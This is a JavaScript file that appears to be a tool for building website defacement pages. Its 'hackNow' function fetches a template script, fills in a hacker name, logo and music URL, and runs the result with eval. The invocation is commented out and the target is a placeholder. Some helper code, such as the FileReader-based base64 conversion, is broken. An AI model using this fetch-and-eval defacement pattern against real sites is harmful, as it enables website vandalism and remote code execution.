
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
String.prototype.replaceAll = function (search, replacement) {
    var target = this;
    return target.replace(new RegExp(search, 'g'), replacement);
};

function toDataURL(url, callback) {
    var xhr = new XMLHttpRequest();
    xhr.onload = function () {
        var reader = new FileReader();
        reader.onloadend = function () {
            callback(reader.result);
        }
        reader.readAsDataURL(xhr.response);
    };
    xhr.open('GET', url);
    xhr.responseType = 'blob';
    xhr.send();
}

const hackNow = async (option = {}) => {
    const get = async (url) => { return await fetch(url, { headers: { "User-Agent": "okhttp/4.5.0" }, method: "GET" }) }
    const getText = async (url) => { return (await get(url)).text() }
    const getImage = async (url) => { return "data:image/jpg;base64," + new Buffer.from(await (await get(url)).buffer()).toString('base64') }
    const logo = await getImage(option.logo !== undefined ? option.logo : "https://p34c3-khyrein.github.io/static/media/cyber-sec.092e9c1c.jpg");
    const execute = String(await getText("http://localhost/jso-engine.js"))
        .replaceAll("RRsiteRR", "test-site.com") // document.title   "test-site.com"
        .replaceAll("RRhackerRR", option.hacker !== undefined ? option.hacker : "P34C3-KHYREIN")
        .replaceAll("RRlogoRR", logo)
        .replaceAll("RRmusicRR", option.music !== undefined ? option.music : "https://raw.githack.com/p34c3-khyrein/mp3/main/mi.mp3");
    eval(execute);
    /**
        hackNow({
            hacker: "",
            logo: "",
            music: "",
        })
     */
    console.log({ execute, logo });
}

// hackNow()





const get = async (url) => { return await fetch(url, { headers: { "User-Agent": "okhttp/4.5.0" }, method: "GET" }) }
const getImage = async (url) => { return (await get(url)).buffer() }
let bufferToBase64 = async (buffer) => {
    const reader = await new FileReader();
    await reader.readAsDataURL(buffer);
    return reader.onloadend = await function () {
        return (reader.result);
    }
}

console.log({
    test: bufferToBase64(await getImage("https://p34c3-khyrein.github.io/static/media/cyber-sec.092e9c1c.jpg"))
});